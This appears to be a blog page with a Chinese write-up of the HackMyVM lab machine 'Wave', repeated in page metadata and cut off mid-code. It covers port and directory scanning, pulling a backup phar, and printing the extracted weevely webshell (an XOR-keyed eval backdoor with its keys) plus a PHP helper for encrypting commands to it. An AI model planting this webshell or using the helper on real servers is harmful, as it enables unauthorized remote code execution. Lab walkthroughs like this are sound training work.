@@ -1,0 +1,1098 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://7r1umph.top/css/primer.css' rel='stylesheet' />
+    <link href='https://7r1umph.top/css/matrix.css' rel='stylesheet' /><script src='https://7r1umph.top/plugins/theme.js'></script><script src='https://7r1umph.top/plugins/StatsSidebar.js'></script>
+    <link rel="icon" href="https://7r1umph.top/image/20250320200557660.ico">
+<meta name="description" content="# hmv_Wave
+
+# 0.简介
+
+**靶机**：[hackmyvm - Wave](https://hackmyvm.eu/machines/machine.php?vm=Wave)
+**难度**：黄色
+**目标 IP**：192.168.205.138
+**本机 IP**：192.168.205.141
+
+# 1.扫描
+
+`nmap`起手
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-18 18:30 CST
+Nmap scan report for 192.168.205.138
+Host is up (0.00029s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+5555/tcp open  freeciv
+MAC Address: 08:00:27:37:83:76 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.58 seconds
+```
+
+去80看看web页面
+
+# 2.踩点
+
+![Image](https://github.com/user-attachments/assets/fc213d31-5792-4ec3-bc4f-f8ddc75839bb)
+
+爆破目录
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ feroxbuster -u 'http://192.168.205.138/' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md 
+                                                                                                                                  
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben 'epi' Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://192.168.205.138/
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php, html, txt, md]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET        7l       11w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                 
+200      GET        3l        5w       32c http://192.168.205.138/backup/phptest.bck
+200      GET        3l        6w       31c http://192.168.205.138/backup/index.bck
+200      GET        2l        1w        4c http://192.168.205.138/backup/log.log
+200      GET        1l        2w       18c http://192.168.205.138/backup/robots.bck
+200      GET        2l       13w      833c http://192.168.205.138/backup/weevely.bck
+200      GET        3l        6w       31c http://192.168.205.138/
+301      GET        7l       11w      169c http://192.168.205.138/backup => http://192.168.205.138/backup/
+200      GET        3l        6w       31c http://192.168.205.138/index.html
+200      GET        1l        2w       18c http://192.168.205.138/robots.txt
+200      GET        1l        2w       11c http://192.168.205.138/phptest.php
+[####################] - 48s   311445/311445  0s      found:10      errors:0    
+[####################] - 47s   311410/311410  6566/s  http://192.168.205.138/ 
+[####################] - 0s    311410/311410  77852500/s http://192.168.205.138/backup/ => Directory listing (add --scan-dir-listings to scan)                           
+```
+
+探索一下
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138/backup/phptest.bck
+<?php
+print ('HELLO WORLD');
+?>
+                                                                                                                                
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138/backup/index.bck  
+<h1> WAVE </h1>
+
+<!-- wAvE -->
+                                                                                                                                
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138/backup/log.log  
+OK
+
+                                                                                                                                
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138/backup/robots.bck
+Disallow: /backup
+                                                                                                                                
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138/backup/weevely.bck
+Warning: Binary output can mess up your terminal. Use '--output -' to tell curl to output it to your terminal anyway, or consider 
+Warning: '--output <FILE>' to save to a file.
+```
+
+找到了一个文件，我们下载下来看看
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138/backup/weevely.bck -o /tmp/weevely.bck
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   515  100   515    0     0   217k      0 --:--:-- --:--:-- --:--:--  251k
+                                                                                                                                
+┌──(kali㉿kali)-[~/test]
+└─$ cd tmp                                                      
+                                                                                                                                                                                                                                              
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ cat weevely.bck                
+<?php include '\160\x68\141\x72\72\57\57'.basename(__FILE__).'\57\x78';__HALT_COMPILER(); ?>/x�X���U��j�0ſ�)J�hB�S;���
+                                                                                                                      �/�J��▒m�.��)��n�(▒��'`�=6�&T�YE�p��(�q1���a'H�Pq6�.���v���/��8�ĳe��$+��s�'����5�|��H�� O����w�2%��OyTV���Q�b�A���h��=�W {��
+�kЛw8�a����S�����
+�fBLXx  ���Ϝ����v����m���%#,H��R#2HJ]�t�|*��������h�Ms��
+                       ږ&'��Y���P��B��lXw�l�e���E!S�He�2�p�7G�[N��=�-��Ƀ�i�)�[��N����7��U_�=*��Ψ�s?c((VGBMB                                                                                                                                
+
+```
+
+部分内容显示乱码，但是我们通过可读的可以得知，可能是一个恶意后门，我们尝试恢复一下
+
+```bash
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ file weevely.bck
+weevely.bck: PHP phar archive with SHA1 signature
+                                                                                                                                
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ phar extract -f weevely.bck weevely.phpr
+//home/kali/test/tmp/weevely.bck/x ...ok
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ cat /home/kali/test/tmp/weevely.phpr/home/kali/test/tmp/weevely.bck/x 
+<?php eval('$k='3ddf0d5c';$kh='b6e7a529b6c2';$kf='d598a771749b';$p='afnqDsRcBpVmU71y';
+
+function x($t,$k){
+$c=strlen($k);$l=strlen($t);$o='';
+for($i=0;$i<$l;){
+for($j=0;($j<$c&&$i<$l);$j++,$i++)
+{
+$o.=$t[$i]^$k[$j];
+}
+}
+return $o;
+}
+if (@preg_match('/$kh(.+)$kf/',@file_get_contents('php://input'),$m)==1) {
+@ob_start();
+@eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));
+$o=@ob_get_contents();
+@ob_end_clean();
+$r=@base64_encode(@x(@gzcompress($o),$k));
+print('$p$kh$r$kf');
+}');                                                                                                                                
+```
+
+确实是**Webshell 后门**，我们尝试利用一下
+
+```bash
+┌──(kali㉿kali)-[~/…/kali/test/tmp/weevely.bck]
+└─$ cat tool.php 
+<?php
+$k = '3ddf0d5c';  // 密钥
+
+function x($t, $k)
+{
+    $c = strlen($k);  // 密钥长度
+    $l = strlen($t);  // 文本长度
+    $o = '';
+
+    // XOR 加密/解密
+    for ($i = 0; $i < $l;)
+    {
+        for ($j = 0; ($j < $c && $i < $l); $j++, $i++)
+        {
+            $o .= chr(ord($t[$i]) ^ ord($k[$j]));
+        }
+    }
+    return $o;
+}
+
+echo '选择操作：\n';
+echo '1. 加密\n';
+echo '2. 解密\n';
+$choice = trim(fgets(STDIN));  // 获取用户输入
+
+echo '请输入文本：\n';
+$input_text = trim(fgets(STDIN));  // 获取要加密/解密的文本
+
+if ($choice == 1) {
+    // 加密
+    echo '加密前的文本: ' . $input_text . '\n';
+
+    // 压缩文本
+    $compressed_text = gzcompress($input_text);  // 压缩文本
+    $encrypted_text = x($compressed_text, $k);   // XOR 加密
+    echo '加密后的文本: ' . base64_encode($encrypted_text) . '\n';  // 输出 Base64 编码后的加密文本
+} elseif ($choice == 2) {
+    // 解密
+    $decoded_text = base64_decode($input_text);  // Base64 解码
+    $decrypted_text = x($decoded_text, $k);      // XOR 解密
+  
+    // 解压缩
+    $decompressed = @gzuncompress($decrypted_text);  // 解压缩，使用 @ 避免警告
+  
+    // 如果解压成功，则输出解压后的内容；否则输出解密后的内容
+    if ($decompressed !== false) {
+        echo '解密并解压后的文本: ' . $decompressed . '\n';
+    } else {
+        echo '解密后的文本: ' . $decrypted_text . '\n';
+    }
+} else {
+    echo '无效的选项\n';
+}
+?>
+```
+
+加密和解密模块（解密模块是乱码，建议不用，或者自己改）。">
+<meta property="og:title" content="hmv_Wave">
+<meta property="og:description" content="# hmv_Wave
+
+# 0.简介
+
+**靶机**：[hackmyvm - Wave](https://hackmyvm.eu/machines/machine.php?vm=Wave)
+**难度**：黄色
+**目标 IP**：192.168.205.138
+**本机 IP**：192.168.205.141
+
+# 1.扫描
+
+`nmap`起手
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-18 18:30 CST
+Nmap scan report for 192.168.205.138
+Host is up (0.00029s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+5555/tcp open  freeciv
+MAC Address: 08:00:27:37:83:76 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.58 seconds
+```
+
+去80看看web页面
+
+# 2.踩点
+
+![Image](https://github.com/user-attachments/assets/fc213d31-5792-4ec3-bc4f-f8ddc75839bb)
+
+爆破目录
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ feroxbuster -u 'http://192.168.205.138/' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md 
+                                                                                                                                  
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben 'epi' Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://192.168.205.138/
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php, html, txt, md]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET        7l       11w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                 
+200      GET        3l        5w       32c http://192.168.205.138/backup/phptest.bck
+200      GET        3l        6w       31c http://192.168.205.138/backup/index.bck
+200      GET        2l        1w        4c http://192.168.205.138/backup/log.log
+200      GET        1l        2w       18c http://192.168.205.138/backup/robots.bck
+200      GET        2l       13w      833c http://192.168.205.138/backup/weevely.bck
+200      GET        3l        6w       31c http://192.168.205.138/
+301      GET        7l       11w      169c http://192.168.205.138/backup => http://192.168.205.138/backup/
+200      GET        3l        6w       31c http://192.168.205.138/index.html
+200      GET        1l        2w       18c http://192.168.205.138/robots.txt
+200      GET        1l        2w       11c http://192.168.205.138/phptest.php
+[####################] - 48s   311445/311445  0s      found:10      errors:0    
+[####################] - 47s   311410/311410  6566/s  http://192.168.205.138/ 
+[####################] - 0s    311410/311410  77852500/s http://192.168.205.138/backup/ => Directory listing (add --scan-dir-listings to scan)                           
+```
+
+探索一下
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138/backup/phptest.bck
+<?php
+print ('HELLO WORLD');
+?>
+                                                                                                                                
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138/backup/index.bck  
+<h1> WAVE </h1>
+
+<!-- wAvE -->
+                                                                                                                                
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138/backup/log.log  
+OK
+
+                                                                                                                                
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138/backup/robots.bck
+Disallow: /backup
+                                                                                                                                
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138/backup/weevely.bck
+Warning: Binary output can mess up your terminal. Use '--output -' to tell curl to output it to your terminal anyway, or consider 
+Warning: '--output <FILE>' to save to a file.
+```
+
+找到了一个文件，我们下载下来看看
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138/backup/weevely.bck -o /tmp/weevely.bck
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   515  100   515    0     0   217k      0 --:--:-- --:--:-- --:--:--  251k
+                                                                                                                                
+┌──(kali㉿kali)-[~/test]
+└─$ cd tmp                                                      
+                                                                                                                                                                                                                                              
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ cat weevely.bck                
+<?php include '\160\x68\141\x72\72\57\57'.basename(__FILE__).'\57\x78';__HALT_COMPILER(); ?>/x�X���U��j�0ſ�)J�hB�S;���
+                                                                                                                      �/�J��▒m�.��)��n�(▒��'`�=6�&T�YE�p��(�q1���a'H�Pq6�.���v���/��8�ĳe��$+��s�'����5�|��H�� O����w�2%��OyTV���Q�b�A���h��=�W {��
+�kЛw8�a����S�����
+�fBLXx  ���Ϝ����v����m���%#,H��R#2HJ]�t�|*��������h�Ms��
+                       ږ&'��Y���P��B��lXw�l�e���E!S�He�2�p�7G�[N��=�-��Ƀ�i�)�[��N����7��U_�=*��Ψ�s?c((VGBMB                                                                                                                                
+
+```
+
+部分内容显示乱码，但是我们通过可读的可以得知，可能是一个恶意后门，我们尝试恢复一下
+
+```bash
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ file weevely.bck
+weevely.bck: PHP phar archive with SHA1 signature
+                                                                                                                                
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ phar extract -f weevely.bck weevely.phpr
+//home/kali/test/tmp/weevely.bck/x ...ok
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ cat /home/kali/test/tmp/weevely.phpr/home/kali/test/tmp/weevely.bck/x 
+<?php eval('$k='3ddf0d5c';$kh='b6e7a529b6c2';$kf='d598a771749b';$p='afnqDsRcBpVmU71y';
+
+function x($t,$k){
+$c=strlen($k);$l=strlen($t);$o='';
+for($i=0;$i<$l;){
+for($j=0;($j<$c&&$i<$l);$j++,$i++)
+{
+$o.=$t[$i]^$k[$j];
+}
+}
+return $o;
+}
+if (@preg_match('/$kh(.+)$kf/',@file_get_contents('php://input'),$m)==1) {
+@ob_start();
+@eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));
+$o=@ob_get_contents();
+@ob_end_clean();
+$r=@base64_encode(@x(@gzcompress($o),$k));
+print('$p$kh$r$kf');
+}');                                                                                                                                
+```
+
+确实是**Webshell 后门**，我们尝试利用一下
+
+```bash
+┌──(kali㉿kali)-[~/…/kali/test/tmp/weevely.bck]
+└─$ cat tool.php 
+<?php
+$k = '3ddf0d5c';  // 密钥
+
+function x($t, $k)
+{
+    $c = strlen($k);  // 密钥长度
+    $l = strlen($t);  // 文本长度
+    $o = '';
+
+    // XOR 加密/解密
+    for ($i = 0; $i < $l;)
+    {
+        for ($j = 0; ($j < $c && $i < $l); $j++, $i++)
+        {
+            $o .= chr(ord($t[$i]) ^ ord($k[$j]));
+        }
+    }
+    return $o;
+}
+
+echo '选择操作：\n';
+echo '1. 加密\n';
+echo '2. 解密\n';
+$choice = trim(fgets(STDIN));  // 获取用户输入
+
+echo '请输入文本：\n';
+$input_text = trim(fgets(STDIN));  // 获取要加密/解密的文本
+
+if ($choice == 1) {
+    // 加密
+    echo '加密前的文本: ' . $input_text . '\n';
+
+    // 压缩文本
+    $compressed_text = gzcompress($input_text);  // 压缩文本
+    $encrypted_text = x($compressed_text, $k);   // XOR 加密
+    echo '加密后的文本: ' . base64_encode($encrypted_text) . '\n';  // 输出 Base64 编码后的加密文本
+} elseif ($choice == 2) {
+    // 解密
+    $decoded_text = base64_decode($input_text);  // Base64 解码
+    $decrypted_text = x($decoded_text, $k);      // XOR 解密
+  
+    // 解压缩
+    $decompressed = @gzuncompress($decrypted_text);  // 解压缩，使用 @ 避免警告
+  
+    // 如果解压成功，则输出解压后的内容；否则输出解密后的内容
+    if ($decompressed !== false) {
+        echo '解密并解压后的文本: ' . $decompressed . '\n';
+    } else {
+        echo '解密后的文本: ' . $decrypted_text . '\n';
+    }
+} else {
+    echo '无效的选项\n';
+}
+?>
+```
+
+加密和解密模块（解密模块是乱码，建议不用，或者自己改）。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPH.github.io/post/hmv_Wave.html">
+<meta property="og:image" content="https://7r1umph.top/image/202506121404919.webp">
+<title>hmv_Wave</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">hmv_Wave</h1>
+<div class="title-right">
+    <a href="https://7r1UMPH.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPH/7r1UMPH.github.io/issues/37" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>hmv_Wave</h1>
+<h1>0.简介</h1>
+<p><strong>靶机</strong>：<a href="https://hackmyvm.eu/machines/machine.php?vm=Wave" rel="nofollow">hackmyvm - Wave</a><br>
+<strong>难度</strong>：黄色<br>
+<strong>目标 IP</strong>：192.168.205.138<br>
+<strong>本机 IP</strong>：192.168.205.141</p>
+<h1>1.扫描</h1>
+<p><code class="notranslate">nmap</code>起手</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-18 18:30 CST
+Nmap scan report <span class="pl-k">for</span> 192.168.205.138
+Host is up (0.00029s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+5555/tcp open  freeciv
+MAC Address: 08:00:27:37:83:76 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 1.58 seconds</pre></div>
+<p>去80看看web页面</p>
+<h1>2.踩点</h1>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/fc213d31-5792-4ec3-bc4f-f8ddc75839bb"><img src="https://github.com/user-attachments/assets/fc213d31-5792-4ec3-bc4f-f8ddc75839bb" alt="Image" style="max-width: 100%;"></a></p>
+<p>爆破目录</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ feroxbuster -u <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.138/<span class="pl-pds">"</span></span> -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md 
+                                                                                                                                  
+ ___  ___  __   __     __      __         __   ___
+<span class="pl-k">|</span>__  <span class="pl-k">|</span>__  <span class="pl-k">|</span>__) <span class="pl-k">|</span>__) <span class="pl-k">|</span> /  <span class="pl-s"><span class="pl-pds">`</span>    /  <span class="pl-cce">\ \_</span>/ <span class="pl-k">|</span> <span class="pl-k">|</span>  <span class="pl-cce">\ </span><span class="pl-k">|</span>__</span>
+<span class="pl-s"><span class="pl-k">|</span>    <span class="pl-k">|</span>___ <span class="pl-k">|</span>  <span class="pl-cce">\ </span><span class="pl-k">|</span>  <span class="pl-cce">\ </span><span class="pl-k">|</span> <span class="pl-cce">\_</span>_,    <span class="pl-cce">\_</span>_/ / <span class="pl-cce">\ </span><span class="pl-k">|</span> <span class="pl-k">|</span>__/ <span class="pl-k">|</span>___</span>
+<span class="pl-s">by Ben <span class="pl-s"><span class="pl-pds">"</span>epi<span class="pl-pds">"</span></span> Risher 🤓                 ver: 2.11.0</span>
+<span class="pl-s">───────────────────────────┬──────────────────────</span>
+<span class="pl-s"> 🎯  Target Url            │ http://192.168.205.138/</span>
+<span class="pl-s"> 🚀  Threads               │ 50</span>
+<span class="pl-s"> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt</span>
+<span class="pl-s"> 👌  Status Codes          │ All Status Codes<span class="pl-k">!</span></span>
+<span class="pl-s"> 💥  Timeout (secs)        │ 7</span>
+<span class="pl-s"> 🦡  User-Agent            │ feroxbuster/2.11.0</span>
+<span class="pl-s"> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml</span>
+<span class="pl-s"> 🔎  Extract Links         │ <span class="pl-c1">true</span></span>
+<span class="pl-s"> 💲  Extensions            │ [php, html, txt, md]</span>
+<span class="pl-s"> 🏁  HTTP methods          │ [GET]</span>
+<span class="pl-s"> 🔃  Recursion Depth       │ 4</span>
+<span class="pl-s">───────────────────────────┴──────────────────────</span>
+<span class="pl-s"> 🏁  Press [ENTER] to use the Scan Management Menu™</span>
+<span class="pl-s">──────────────────────────────────────────────────</span>
+<span class="pl-s">404      GET        7l       11w      153c Auto-filtering found 404-like response and created new filter<span class="pl-k">;</span> toggle off with --dont-filter                                                                                                                                 </span>
+<span class="pl-s">200      GET        3l        5w       32c http://192.168.205.138/backup/phptest.bck</span>
+<span class="pl-s">200      GET        3l        6w       31c http://192.168.205.138/backup/index.bck</span>
+<span class="pl-s">200      GET        2l        1w        4c http://192.168.205.138/backup/log.log</span>
+<span class="pl-s">200      GET        1l        2w       18c http://192.168.205.138/backup/robots.bck</span>
+<span class="pl-s">200      GET        2l       13w      833c http://192.168.205.138/backup/weevely.bck</span>
+<span class="pl-s">200      GET        3l        6w       31c http://192.168.205.138/</span>
+<span class="pl-s">301      GET        7l       11w      169c http://192.168.205.138/backup =<span class="pl-k">&gt;</span> http://192.168.205.138/backup/</span>
+<span class="pl-s">200      GET        3l        6w       31c http://192.168.205.138/index.html</span>
+<span class="pl-s">200      GET        1l        2w       18c http://192.168.205.138/robots.txt</span>
+<span class="pl-s">200      GET        1l        2w       11c http://192.168.205.138/phptest.php</span>
+<span class="pl-s">[<span class="pl-c"><span class="pl-c">#</span>###################] - 48s   311445/311445  0s      found:10      errors:0    </span></span>
+<span class="pl-s">[<span class="pl-c"><span class="pl-c">#</span>###################] - 47s   311410/311410  6566/s  http://192.168.205.138/ </span></span>
+<span class="pl-s">[<span class="pl-c"><span class="pl-c">#</span>###################] - 0s    311410/311410  77852500/s http://192.168.205.138/backup/ =&gt; Directory listing (add --scan-dir-listings to scan)                           </span></span></pre></div>
+<p>探索一下</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138/backup/phptest.bck
+<span class="pl-k">&lt;</span><span class="pl-k">?</span>php
+print (<span class="pl-s"><span class="pl-pds">"</span>HELLO WORLD<span class="pl-pds">"</span></span>)<span class="pl-k">;</span>
+<span class="pl-k">?</span><span class="pl-k">&gt;</span>
+                                                                                                                                
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138/backup/index.bck  
+<span class="pl-k">&lt;</span>h<span class="pl-k">1&gt;</span> WAVE <span class="pl-k">&lt;</span>/h<span class="pl-k">1&gt;</span>
+
+<span class="pl-k">&lt;</span><span class="pl-k">!</span>-- wAvE --<span class="pl-k">&gt;</span>
+                                                                                                                                
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138/backup/log.log  
+OK
+
+                                                                                                                                
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138/backup/robots.bck
+Disallow: /backup
+                                                                                                                                
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138/backup/weevely.bck
+Warning: Binary output can mess up your terminal. Use <span class="pl-s"><span class="pl-pds">"</span>--output -<span class="pl-pds">"</span></span> to tell curl to output it to your terminal anyway, or consider 
+Warning: <span class="pl-s"><span class="pl-pds">"</span>--output &lt;FILE&gt;<span class="pl-pds">"</span></span> to save to a file.</pre></div>
+<p>找到了一个文件，我们下载下来看看</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138/backup/weevely.bck -o /tmp/weevely.bck
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   515  100   515    0     0   217k      0 --:--:-- --:--:-- --:--:--  251k
+                                                                                                                                
+┌──(kali㉿kali)-[~/test]
+└─$ <span class="pl-c1">cd</span> tmp                                                      
+                                                                                                                                                                                                                                              
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ cat weevely.bck                
+<span class="pl-k">&lt;</span><span class="pl-k">?</span>php include <span class="pl-s"><span class="pl-pds">"</span>\160\x68\141\x72\72\57\57<span class="pl-pds">"</span></span>.basename(__FILE__).<span class="pl-s"><span class="pl-pds">"</span>\57\x78<span class="pl-pds">"</span></span><span class="pl-k">;</span><span class="pl-en">__HALT_COMPILER</span>(); <span class="pl-k">?</span><span class="pl-k">&gt;</span>/x�X���U��j�0ſ�)J�hB�S<span class="pl-k">;</span>���
+                                                                                                                      �/�J��▒m�.��)��n�(▒��<span class="pl-s"><span class="pl-pds">"</span><span class="pl-s"><span class="pl-pds">`</span>�=6�<span class="pl-k">&amp;</span>T�YE�p��(�q1���a<span class="pl-s"><span class="pl-pds">'</span>H�Pq6�.���v���/��8�ĳe��$+��s�"����5�|��H�� O����w�2%��OyTV���Q�b�A���h��=�W {��</span></span></span>
+<span class="pl-s"><span class="pl-s"><span class="pl-s">�kЛw8�a����S�����</span></span></span>
+<span class="pl-s"><span class="pl-s"><span class="pl-s">�fBLXx  ���Ϝ����v����m���%#,H��R#2HJ]�t�|*��������h�Ms��</span></span></span>
+<span class="pl-s"><span class="pl-s"><span class="pl-s">                       ږ&amp;<span class="pl-pds">'</span></span>��Y���P��B��lXw�l�e���E<span class="pl-k">!</span>S�He�2�p�7G�[N��<span class="pl-k">=</span>�-��Ƀ�i�)�[��N����7��U_�<span class="pl-k">=</span><span class="pl-k">*</span>��Ψ�s<span class="pl-k">?</span>c<span class="pl-s"><span class="pl-pds">((</span>VGBMB                                                                                                                                </span></span></span>
+<span class="pl-s"><span class="pl-s"><span class="pl-s"></span></span></span></pre></div>
+<p>部分内容显示乱码，但是我们通过可读的可以得知，可能是一个恶意后门，我们尝试恢复一下</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test/tmp]
+└─$ file weevely.bck
+weevely.bck: PHP phar archive with SHA1 signature
+                                                                                                                                
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ phar extract -f weevely.bck weevely.phpr
+//home/kali/test/tmp/weevely.bck/x ...ok
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ cat /home/kali/test/tmp/weevely.phpr/home/kali/test/tmp/weevely.bck/x 
+<span class="pl-k">&lt;</span><span class="pl-k">?</span>php eval(<span class="pl-s"><span class="pl-pds">'</span>$k="3ddf0d5c";$kh="b6e7a529b6c2";$kf="d598a771749b";$p="afnqDsRcBpVmU71y";</span>
+<span class="pl-s"></span>
+<span class="pl-s">function x($t,$k){</span>
+<span class="pl-s">$c=strlen($k);$l=strlen($t);$o="";</span>
+<span class="pl-s">for($i=0;$i&lt;$l;){</span>
